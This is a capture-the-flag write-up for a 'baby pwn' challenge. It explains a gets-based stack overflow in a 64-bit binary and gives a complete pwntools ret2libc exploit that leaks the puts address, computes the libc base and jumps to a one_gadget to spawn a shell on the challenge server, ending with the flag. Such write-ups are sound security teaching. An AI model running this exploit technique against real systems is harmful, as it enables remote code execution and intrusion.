# baby pwn

## Pwn - Points: 490

> Mommy what is stack overflow?
>
> 
>
> `nc 35.188.73.186 1111`
>
> 
>
> **Author**
>
> 
>
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;codacker
>
> [vuln](vuln)
>

Checking the provided binary with `checksec` shows the enabled security mechanisms:

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The program consists of a `gets` and `puts` call to echo back an user input. The buffer size is 256 and can overflow and since it is compiled without stack canaries, it immediately enables us to get code execution. Since the NX bit is enabled, we can not execute code in any writable areas, e.g. the stack, so we can not easily execute shellcode there. Since the binary is dynamically linked we can use `ret-2-libc`, but with `ASLR` enabled, we need to find a way to leak the libc base address.

To achieve that, we prepare a `puts` call to print the real address of `puts` out by putting a `ROP` gadget `pop rdi, ret` followed by the `puts` address from the `GOT` table followed by the address of `puts` (PLT) on the stack. This will call the `puts` function with the `GOT` address of `puts` as argument (`RDI` register). In addition we put the address of the `main` function on the stack, so that the program recursively executes again from the beginning and on the second stage we directly overflow and jump to `one_gadget` with the needed offset of `libc` to get the shell.

```python
from pwn import *

libc = ELF('libc-2.27.so')
e = ELF('vuln')

rop = ROP('vuln')
pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

p = remote('35.188.73.186', 1111)
# p = process('vuln')

print p.recvuntil('>')

# first stage, print puts address and recursively call main again
p.sendline('A'*264+p64(pop_rdi_ret)+p64(e.got['puts'])+p64(e.symbols['puts'])+p64(e.symbols['main']))
p.recvuntil('\n')
p.recvuntil('\n')
puts = u64(p.recv(6) + '\x00\x00')

print p.recvuntil('>')

# calculate libc base address
libc_base = puts - libc.symbols['puts']
print 'libc_base: ' + hex(libc_base)

# execve /bin/sh found by one_gadget
one_gadget = 0x4f322

# second stage, overflow with one_gadget to spawn a shell
p.sendline('A'*264+p64(ret)+p64(libc_base + one_gadget))
p.interactive()

```

flag: `rooters{L0l_W3lc0m3_70_7h3_0f_Pwn1ng}ctf`